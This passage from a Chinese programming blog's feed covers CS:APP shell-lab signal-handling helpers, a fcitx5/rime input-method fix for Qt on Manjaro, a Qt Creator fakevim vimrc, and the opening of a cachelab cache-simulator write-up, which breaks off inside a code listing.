class="built_in">fprintf</span>(<span class="built_in">stdout</span>, <span class="string">&quot;%s: %s\n&quot;</span>, msg, strerror(errno));</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * app_error - application-style error routine</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">app_error</span><span class="params">(<span class="keyword">char</span> *msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stdout</span>, <span class="string">&quot;%s\n&quot;</span>, msg);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Signal - wrapper for the sigaction function</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">handler_t</span> *<span class="title">Signal</span><span class="params">(<span class="keyword">int</span> signum, <span class="keyword">handler_t</span> *handler)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sigaction</span> <span class="title">action</span>, <span class="title">old_action</span>;</span></span><br><span class="line"></span><br><span class="line">    action.sa_handler = handler;</span><br><span class="line">    sigemptyset(&amp;action.sa_mask); <span class="comment">/* block sigs of type being handled */</span></span><br><span class="line">    action.sa_flags = SA_RESTART; <span class="comment">/* restart syscalls if possible */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (sigaction(signum, &amp;action, &amp;old_action) &lt; <span class="number">0</span>)</span><br><span class="line">        unix_error(<span class="string">&quot;Signal error&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> (old_action.sa_handler);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * sigquit_handler - The driver program can gracefully terminate the</span></span><br><span class="line"><span class="comment"> *    child shell by sending it a SIGQUIT signal.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sigquit_handler</span><span class="params">(<span class="keyword">int</span> sig)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Terminating after receipt of SIGQUIT signal\n&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;本次lab, shlab. 即编写一个简单的shell。&lt;/p&gt;
&lt;h2 id=&quot;0-背景知识&quot;&gt;&lt;a href=&quot;#0-背景知识&quot; class=&quot;headerlink&quot; title=&quot;0. 背景知识&quot;&gt;&lt;/a&gt;0. 背景知识&lt;/h2&gt;&lt;p&gt;shlab相对其它lab要简单一些，但是其中牵涉出来的一些概念是相当难的。简单说一下这次lab依赖的背景知识吧。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;书籍对应 异常控制流 章节&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ol&gt;
&lt;li&gt;理解进程的概念，linux如何创建新进程，进程的状态转换，回收等过程。&lt;/li&gt;
&lt;li&gt;理解linux中的signal概念，掌握如何发送、接收、处理signal事件，理解signal handler中的 &lt;strong&gt;Async-Signal-Safety问题及解决方案（也是本次实验的难点）&lt;/strong&gt; ，掌握async-signal-safety的guideline.&lt;/li&gt;
&lt;/ol&gt;
    
    </summary>
    
    
      <category term="Csapp" scheme="https://www.ravenxrz.ink/categories/Csapp/"/>
    
    
      <category term="shlab" scheme="https://www.ravenxrz.ink/tags/shlab/"/>
    
  </entry>
  
  <entry>
    <title>linux下rime输入法无法在qt中输入的解决办法</title>
    <link href="https://www.ravenxrz.ink/archives/167d6ba3.html"/>
    <id>https://www.ravenxrz.ink/archives/167d6ba3.html</id>
    <published>2020-08-11T11:33:51.000Z</published>
    <updated>2020-09-06T07:37:36.765Z</updated>
    
    <content type="html"><![CDATA[<h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><p>今天在manjaro下做qt开发时，发现fcitx-rime输入法无法在qtcreator中输入，google了一波，发现应该是差了某个动态库，网上的发行版大多以debian系列为主，apt安装个包就完了，arch系列不是这样解决的。</p><a id="more"></a><h2 id="解决"><a href="#解决" class="headerlink" title="解决"></a>解决</h2><p>继续看arch的wiki，搜索fcitx qt等关键词后，发现现在arch都使用的fcitx5了，fcitx5有qt的插件，能够完美解决这些这些问题，具体来说，卸载以前的旧版本fcitx，安装以下包：</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/5f22402714195aa594ef0f0e.png" alt="image-20200730113135729"></p><p>参照arch的wiki，安装这些包后，还需要配置环境变量：</p><p>vim ~/.pam_environment </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">INPUT_METHOD  DEFAULT=fcitx5</span><br><span class="line">GTK_IM_MODULE DEFAULT=fcitx5</span><br><span class="line">QT_IM_MODULE  DEFAULT=fcitx5</span><br><span class="line">XMODIFIERS    DEFAULT=@im=fcitx5</span><br></pre></td></tr></table></figure><p>要开机自启动fcitx，执行：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp /usr/share/applications/fcitx5.desktop ~/.config/autostart</span><br></pre></td></tr></table></figure><p>注销后重新登录，打开fcitx5配置GUI：</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/5f224cc914195aa594f584e9.png" alt="image-20200730113337696"></p><p>rime的配置文件路径也变了，具体路径：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">~&#x2F;.local&#x2F;share&#x2F;fcitx5&#x2F;rime</span><br></pre></td></tr></table></figure><p>最后一个问题，<strong>修改候选框的字体大小</strong>，这个我找了很久：</p><p><img data-src="https://pic.downk.cc/item/5f22404814195aa594ef2114.png" alt="image-20200730113538459"></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;问题&quot;&gt;&lt;a href=&quot;#问题&quot; class=&quot;headerlink&quot; title=&quot;问题&quot;&gt;&lt;/a&gt;问题&lt;/h2&gt;&lt;p&gt;今天在manjaro下做qt开发时，发现fcitx-rime输入法无法在qtcreator中输入，google了一波，发现应该是差了某个动态库，网上的发行版大多以debian系列为主，apt安装个包就完了，arch系列不是这样解决的。&lt;/p&gt;
    
    </summary>
    
    
      <category term="杂文" scheme="https://www.ravenxrz.ink/categories/%E6%9D%82%E6%96%87/"/>
    
    
      <category term="输入法" scheme="https://www.ravenxrz.ink/tags/%E8%BE%93%E5%85%A5%E6%B3%95/"/>
    
  </entry>
  
  <entry>
    <title>Qt 配置+fakevim自定义</title>
    <link href="https://www.ravenxrz.ink/archives/afbe8180.html"/>
    <id>https://www.ravenxrz.ink/archives/afbe8180.html</id>
    <published>2020-08-10T11:29:53.000Z</published>
    <updated>2020-09-06T07:37:36.758Z</updated>
    
    <content type="html"><![CDATA[<p>项目原因，要写点qt代码。记录下个人配置：</p><a id="more"></a><ol><li>高分屏下字体过小问题</li></ol><p><img data-src="https://pic.downk.cc/item/5f1a50e514195aa594c27812.jpg"></p><ol start="2"><li>上下文帮助菜单（即快捷键F1）字体过小问题：</li></ol><p>目前在manjaro-gnome上通过更改字体大小无效，只能更改渲染引擎，然后再更改字体大小，才能生效。</p><p><img data-src="https://pic.downk.cc/item/5f1a512214195aa594c29044.jpg"></p><ol start="3"><li>fakevim配置</li></ol><p><img data-src="https://pic.downk.cc/item/5f1a524414195aa594c3099c.jpg"></p><p>注意右边有个传递Control按键，开启这个选项后，能够使系统自带的一些快捷键（如Ctrl+R,Ctrl+O)和vim的一些特性共同使用。 但是就我个人而言，这样会失去一些vim的快捷键，所以未开启。</p><p>如果不开启传递Control， 那么Ctrl+R，Ctrl+F等常用qtcreator的快捷键又无法使用，好在fakevim支持vimrc，也支持定义ex command，所以可以自行配置vimrc来做键位mapping。下面以 “Run“命令为例，讲解如何配置vimrc。</p><p>打开Fakevim的ex command mapping:</p><p><img data-src="https://pic.downk.cc/item/5f1a535914195aa594c3663f.jpg"></p><p>然后打开你的vimrc，（个人为qt新建了一个配置文件，放在~/.qtvimrc下）</p><p>写上:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&quot; run operation</span><br><span class="line">map ;r :run&lt;CR&gt;</span><br></pre></td></tr></table></figure><p>这样，就将 “ ;r “ 快捷键绑定为 Run命令了。</p><p>其余命令同理，现在fake vim中的ex command命令中写上mapping命令，然后在vimrc中mapping键位。</p><p>下面是我个人的全部qtvimrc：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line">&quot; 显示当前模式</span><br><span class="line">set showmode</span><br><span class="line">&quot; 共享系统粘贴板</span><br><span class="line">set clipborad&#x3D;unamed</span><br><span class="line">&quot; 打开行号</span><br><span class="line">set number</span><br><span class="line">&quot; 打开相对行号</span><br><span class="line">&quot; set relativenumber</span><br><span class="line">&quot; 设置命令历史记录条数</span><br><span class="line">set history&#x3D;2000</span><br><span class="line">&quot; 关闭兼容vi</span><br><span class="line">set nocompatible</span><br><span class="line">&quot; 开启语法高亮功能</span><br><span class="line">syntax enable</span><br><span class="line">&quot; 允许用指定语法高亮配色方案替换默认方案</span><br><span class="line">syntax on</span><br><span class="line">&quot; 模式搜索实时预览,增量搜索</span><br><span class="line">set incsearch</span><br><span class="line">&quot; 设置搜索高亮</span><br><span class="line">set hlsearch</span><br><span class="line">&quot; 忽略大小写 (该命令配合smartcase使用较好，否则不要开启)</span><br><span class="line">set ignorecase</span><br><span class="line">&quot; 模式查找时智能忽略大小写</span><br><span class="line">set smartcase</span><br><span class="line">&quot; vim自身命令行模式智能补全</span><br><span class="line">set wildmenu</span><br><span class="line">&quot; 总是显示状态栏</span><br><span class="line">set laststatus&#x3D;2</span><br><span class="line">&quot; 显示光标当前位置</span><br><span class="line">set ruler</span><br><span class="line">&quot; 高亮显示当前行&#x2F;列</span><br><span class="line">set cursorline</span><br><span class="line">&quot;set cursorcolumn</span><br><span class="line">&quot; 禁止折行</span><br><span class="line">set nowrap</span><br><span class="line">&quot; 将制表符扩展为空格</span><br><span class="line">set expandtab</span><br><span class="line">&quot; 设置编辑时制表符占用空格数</span><br><span class="line">set tabstop&#x3D;4</span><br><span class="line">&quot; 设置格式化时制表符占用空格数</span><br><span class="line">set shiftwidth&#x3D;4</span><br><span class="line">&quot; 让 vim 把连续数量的空格视为一个制表符</span><br><span class="line">set softtabstop&#x3D;4</span><br><span class="line">&quot; 基于缩进或语法进行代码折叠</span><br><span class="line">set foldmethod&#x3D;indent</span><br><span class="line">set foldmethod&#x3D;syntax</span><br><span class="line">&quot; 启动 vim 时关闭折叠代码</span><br><span class="line">set nofoldenable</span><br><span class="line"></span><br><span class="line">&quot; 设置前导键</span><br><span class="line">&quot; let mapleader&#x3D;&quot;;&quot;</span><br><span class="line">&quot; 暂时取消搜索高亮快捷键</span><br><span class="line">nnoremap &lt;silent&gt; ;l :&lt;C-u&gt;nohlsearch&lt;CR&gt;&lt;C-l&gt;</span><br><span class="line"></span><br><span class="line">&quot; 移动相关</span><br><span class="line">&quot; 前一个缓冲区</span><br><span class="line">nnoremap &lt;silent&gt; [b :w&lt;CR&gt;:bprevious&lt;CR&gt;</span><br><span class="line">&quot; 后一个缓冲区</span><br><span class="line">nnoremap &lt;silent&gt; ]b :w&lt;CR&gt;:bnext&lt;CR&gt;</span><br><span class="line">&quot; 定义快捷键到行首和行尾</span><br><span class="line">map H ^</span><br><span class="line">map L $</span><br><span class="line">&quot; 定义快速跳转</span><br><span class="line">nmap ;t &lt;C-]&gt;</span><br><span class="line">&quot; 定义快速跳转回退</span><br><span class="line">nmap ;T &lt;C-t&gt;</span><br><span class="line">&quot; 标签页后退 ---标签页前进是gt</span><br><span class="line">nmap gn gt</span><br><span class="line">nmap gp gT</span><br><span class="line"></span><br><span class="line">&quot; 文件操作相关</span><br><span class="line">&quot; 定义快捷键关闭当前分割窗口</span><br><span class="line">nmap ;q :q&lt;CR&gt;</span><br><span class="line">&quot; 定义快捷键保存当前窗口内容</span><br><span class="line">nmap ;w :w&lt;CR&gt;</span><br><span class="line"></span><br><span class="line">&quot; 窗口操作相关</span><br><span class="line">map &lt;C-j&gt; &lt;C-W&gt;j</span><br><span class="line">map &lt;C-k&gt; &lt;C-W&gt;k</span><br><span class="line">map &lt;C-h&gt; &lt;C-W&gt;h</span><br><span class="line">map &lt;C-l&gt; &lt;C-W&gt;l</span><br><span class="line"></span><br><span class="line">&quot; 使用 qt内部功能</span><br><span class="line">&quot; run operation</span><br><span class="line">map ;r :run&lt;CR&gt;</span><br><span class="line">&quot; copy operation</span><br><span class="line">map ;c :copy&lt;CR&gt;</span><br><span class="line">&quot; paste operation</span><br><span class="line">map ;v :paste&lt;CR&gt;</span><br><span class="line">&quot; cut operation</span><br><span class="line">map ;x :cut&lt;CR&gt;</span><br><span class="line">&quot; Select All</span><br><span class="line">map ;a :selectall&lt;CR&gt;</span><br><span class="line">&quot; reformat code</span><br><span class="line">map ;f :reformatcode&lt;CR&gt;</span><br><span class="line">&quot; 找到usage</span><br><span class="line">map ;u :findusages&lt;CR&gt;</span><br><span class="line">&quot; 调用idea的replace操作</span><br><span class="line">map ;; :replace&lt;CR&gt;</span><br></pre></td></tr></table></figure><p>基本上是从以前的vimrc配置中copy过来的，所以有些设置在qt中是无效的，但是不影响使用。 关键在 “使用qt内部功能”项下的映射。有些可惜的是fakevim不支持leader键位，所以只能在每处mapping中都硬编码为；  。</p><p>4.反缩进问题</p><p>qtcreator有个反人类的地方在于，写代码换行，会自动缩进，但是退格却又需要退几次才能回到上一行，可以改为：</p><p><img data-src="https://pic.downk.cc/item/5f1a556014195aa594c428c1.jpg"></p><p>剩下的就看个人配置了。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;项目原因，要写点qt代码。记录下个人配置：&lt;/p&gt;
    
    </summary>
    
    
      <category term="杂文" scheme="https://www.ravenxrz.ink/categories/%E6%9D%82%E6%96%87/"/>
    
    
      <category term="vim" scheme="https://www.ravenxrz.ink/tags/vim/"/>
    
  </entry>
  
  <entry>
    <title>Csapp-Cachelab题解</title>
    <link href="https://www.ravenxrz.ink/archives/153b500d.html"/>
    <id>https://www.ravenxrz.ink/archives/153b500d.html</id>
    <published>2020-07-29T10:52:24.000Z</published>
    <updated>2020-09-06T07:37:36.749Z</updated>
    
    <content type="html"><![CDATA[<p>本次 lab, cachelab.</p><h2 id="0-说明"><a href="#0-说明" class="headerlink" title="0. 说明"></a>0. 说明</h2><p>从这个lab开始，终于开始编写一些高级语言的代码了，而不像之前要去分析汇编。但是这并不意味这题目就简单了，实际上，cachelab耗费了我2天多的时间。ok，言归正传，这个lab的目的是什么呢？</p><p>cachelab帮助我们理解计算机存储体系中的重要组成部分–cache。 理解cache是如何组织的，如何工作的，又是如何影响我们的程序的性能的。</p><a id="more"></a><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200726101259903.png" style="zoom: 33%;" /><p>cache站立于整个存储体系的上端（低于寄存器），其重要性不言而喻了。</p><p>题目说明：</p><p>cachelab只有2个题目。</p><ol><li>写一个cache工作的模拟器，给一段内存访问的trace file，根据trace file仿真，得到这段trace file的hit，miss，eviction数。</li><li>编写cache友好的代码，具体是给3种给定大小的矩阵A，求A的转置，每种大小都要miss要求。</li></ol><p>具体题目请参照cachelab的write up。</p><h2 id="1-第一部分–cache工作方式仿真"><a href="#1-第一部分–cache工作方式仿真" class="headerlink" title="1. 第一部分–cache工作方式仿真"></a>1. 第一部分–cache工作方式仿真</h2><p>做完这个题目，可以让人理解cache的组织，工作方式，替换策略等。<strong>先说一下题目，</strong>本题主要可以分为以下几个部分：</p><ol><li>trace file</li></ol><p>题目会给出一些trace files， trace file的格式如下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">I 0400d7d4,8</span><br><span class="line"> M 0421c7f0,4</span><br><span class="line"> L 04f6b868,8</span><br><span class="line"> S 7ff0005c8,8</span><br></pre></td></tr></table></figure><p>语法为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[space]operation address,size</span><br></pre></td></tr></table></figure><p>The operation ﬁeld denotes the type of memory access: “I” denotes an instruction load, “L” a data load,  “S” a data store, and “M” a data modify (i.e., a data load followed by a data store). There is never a space before each “I”. There is always a space before each “M”, “L”, and “S”. The address ﬁeld speciﬁes a 64-bit hexadecimal memory address. The size ﬁeld speciﬁes the number of bytes accessed by the operation.</p><p>值得注意的是，我们只关注 data ，也就是 M,L,S开头的指令，不关注I开头的指令。解析时，可根据开头是否有空格来解析。</p><p>trace file就是我们要编写的代码的输入源，我们要做的就是根据这些trace file来仿真。</p><ol start="2"><li>cache的组织方式</li></ol><p>题目要求，最终的程序可以接受一些参数，改变cache的组织方式。 如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;csim-ref -s 4 -E 1 -b 4 -t traces&#x2F;yi.trace</span><br></pre></td></tr></table></figure><p>代表：</p><ul><li>set的bit位数为: 4</li><li>E=1，即一个set中只有一个cacheline</li><li>b=4，即一个cache line的block位数为4</li><li>trace file的路径为 traces/yi.trace</li></ul><p>具体可使用的语法为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Usage: .&#x2F;csim-ref [-hv] -s &lt;s&gt; -E &lt;E&gt; -b &lt;b&gt; -t &lt;tracefile&gt;</span><br><span class="line">• -h: Optional help ﬂag that prints usage info</span><br><span class="line">• -v: Optional verbose ﬂag that displays trace info</span><br><span class="line">• -s &lt;s&gt;: Number of set index bits (S &#x3D; 2^s is the number of sets)</span><br><span class="line">• -E &lt;E&gt;: Associativity (number of lines per set)</span><br><span class="line">• -b &lt;b&gt;: Number of block bits (B &#x3D; 2^b is the block size)</span><br><span class="line">• -t &lt;tracefile&gt;: Name of the valgrind trace to replay</span><br></pre></td></tr></table></figure><ol start="3"><li>cacheline 的替换策略，采用LRU</li></ol><p>ok，知道这些了，题目还给了我们一个标准答案，csim-ref, 我们自己最终的程序名为csim. 最终只要csim的输入输出和csim-ref相同即可。</p><p><strong>写程序之前，一定要分析好再写，所以先来分析下我们该怎么做：</strong></p><p>需要哪些背景知识：</p><p>cache的组织方式：</p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200726102158585.png" style="zoom: 50%;" /><p>这张图，给出了cache的组织方式以及cacheline的read方式。</p><p>cache的组织方式非常直观，主要参数为 S, E, B. 这3个参数也决定了cache的相联关系：</p><ol><li>E=1, 直接映射</li><li>E!=1,S!=1, E路S组相联</li><li>S=1, 全相联映射。（内存和Disk就是这种映射）</li></ol><p>cacheline的read分为以下几步：</p><ol><li>根绝set bit，决定set索引</li><li>比较该组的所有line，是否有匹配的tag。如有，并且valid有效，则hit，并根据b 决定数据偏移。否则，第3步。</li><li>load该cacheline到cache中，如果该组还有空块（valid=0),则加载到空块中，如果没有空块，则根据替换策略进行替换。</li></ol><p><strong>总结下read(load)操作:</strong></p><ol><li>hit, 能在当前cache中找到cacheline</li><li>miss，不能在cahce中找到cacheline，但是该组中有空cacheline。</li><li>eviction，不能再cache中找到cacheline，且该组中没有空cacheline，需要根据替换策略进行替换。</li></ol><p><strong>现在在看下write(store)操作：</strong></p><p>cachelab采用的的是write-back+write-allocate方式。所以，一旦我们的store miss了，需要将该块load到cache中。分析可以下3中情况：</p><ol><li>hit, 能在当前cache中找到cacheline</li><li>miss，不能在cahce中找到cacheline，但是该组中有空cacheline。</li><li>eviction，不能在cache中找到cacheline，且该组中没有空cacheline，需要根据替换策略进行替换。</li></ol><p><strong>最后看下modify操作：</strong></p><p>modify结合了load和store操作，分析可得以下3种情况：</p><ol><li>hit(load) + hit(store), load命中，store也命中</li><li>miss(load)+hit(store), load miss，但是当前cache set中有空块，直接load到cache即可，后续store命中。</li><li>miss(load)+eviction(load)+hit(store),cache种没有该cacheline，且该组没有空块，最后store可命中</li></ol><blockquote><p>额外啰嗦一段：</p><p>cacheline和block非常容易搞混，因为一会说将某个数据块 load到cache，一会又说将某个cacheline load到cache中。 </p><p>其实通常我们说将xx数据块load到cache中，这个数据块是包围在一个cacheline中的，cacheline除了这个数据块以外，还会包含一些元数据，如tag，valid，以及用于实现替换策略的辅助位等。</p><p><strong>简单来说，cacheline包含block， 通常说的cacheline大小，都是说的cacheline内部的block的大小。如32字节，64字节等，都是说的cacheline内部的block的大小为32，64字节</strong></p></blockquote><p>好了，分析到这里，基本上把整个流程走了一遍。剩下一些与主题无关代码，包括参数解析，trace file解析，可自行看以下代码（代码比较长，因为我加了详细注释，同时为了规范，加了一些“无用”代码，但看着应该没有压力）：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span 